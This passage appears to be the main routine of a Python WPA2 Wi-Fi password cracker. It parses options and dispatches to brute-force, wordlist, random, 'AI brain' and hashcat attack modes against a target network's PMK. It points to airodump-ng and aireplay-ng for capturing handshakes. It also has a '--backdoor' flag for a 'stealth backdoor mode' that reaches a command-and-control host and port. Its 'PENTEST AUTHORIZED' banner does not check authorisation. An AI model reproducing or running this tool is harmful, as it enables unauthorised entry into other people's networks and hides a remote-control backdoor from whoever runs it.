        parser.add_argument("-t", "--threads", type=int, default=4,
                            help="max worker threads for systematic brute force")
        parser.add_argument("--timeout", type=int, default=60,
                            help="timeout in seconds for ai-brain attack")
        parser.add_argument("--max-length", type=int, default=20,
                            help="max password length for AI brain generation")
        parser.add_argument("--max-random", type=int, default=1000000,
                            help="max attempts for random attack")
        parser.add_argument("--logfile", help="optional log file to write output")
        parser.add_argument("--capfile", help=".cap file for hashcat mode (handshake capture)")
        parser.add_argument("--hashcat-path", default="hashcat.exe",
                            help="path to hashcat executable")
        parser.add_argument("--backdoor", nargs='?', const="127.0.0.1:4444",
                            help="activate stealth backdoor mode [C2_HOST:C2_PORT]")

        args = parser.parse_args()

        # if the ssid/pmk were omitted on the command line, fall back to interactive input
        if not args.ssid:
            args.ssid = input("Enter network SSID: ").strip()
        if not args.pmk_hex:
            args.pmk_hex = input("Enter target PMK hex: ").strip()

        if args.logfile:
            # simple logging to file as well as stdout
            import logging

            logging.basicConfig(filename=args.logfile,
                                level=logging.DEBUG,
                                format="%(asctime)s %(message)s")

            def log(msg):
                print(msg)
                logging.debug(msg)
        else:
            log = print

        keys = args.charset
        ssid = args.ssid
        pmk_hex = args.pmk_hex
        log("\n" + "=" * 60)
        log("    PENTEST AUTHORIZED - WPA2 CRACKER (demo)")
        log("=" * 60)
        log(f"[+] Network SSID: {ssid}")
        log(f"[+] Target PMK: {pmk_hex[:32]}...")

        if args.mode == "lightning":
            result = lightning_attack(ssid, pmk_hex, keys)
            if result:
                log(f"\n🎯 CRACKED INSTANTLY: {result}")
            else:
                log("\n[!] Lightning failed - trying smart mode...")
                smart_result = smart_brute_force(ssid, pmk_hex, keys)
                if smart_result:
                    log(f"\n🎯 SMART CRACKED: {smart_result}")
        elif args.mode == "ai-brain":
            result, attempts, elapsed = ai_brain_attack(ssid, pmk_hex, max_length=args.max_length,
                                                        max_threads=args.threads,
                                                        timeout=args.timeout)
            if result:
                log(f"\n🎯 AI BRAIN VICTORY: {result}")
            else:
                log("\n[!] AI brain exhausted, falling back to smart mode...")
                smart_result = smart_brute_force(ssid, pmk_hex, keys)
                if smart_result:
                    log(f"\n🎯 SMART CRACKED: {smart_result}")
        elif args.mode == "smart":
            result = smart_brute_force(ssid, pmk_hex, keys, wordlist=args.wordlist)
            if result:
                log(f"\n🎯 SMART CRACKED: {result}")
        elif args.mode == "systematic":
            result = brute_force_psk(ssid, pmk_hex, keys, max_workers=args.threads)
            if result:
                log(f"\n🎯 BRUTE FORCE CRACKED: {result}")
        elif args.mode == "random":
            result = optimized_random_attack(ssid, pmk_hex, keys, max_attempts=args.max_random)
            if result:
                log(f"\n🎯 RANDOM CRACKED: {result}")
        elif args.mode == "hashcat":
            if not args.capfile:
                log("[!] ERROR: --capfile required for hashcat mode")
                log("[!] Capture handshake first: airodump-ng + aireplay-ng")
                return
            result = hashcat_attack(args.capfile, args.wordlist, args.hashcat_path)
            if result:
                log(f"\n🎯 HASHCAT CRACKED: {result}")
    else:
        # Launch GUI
        root = tk.Tk()
        gui = HackerGUI(root)
        root.mainloop()


if __name__ == "__main__":
    main()

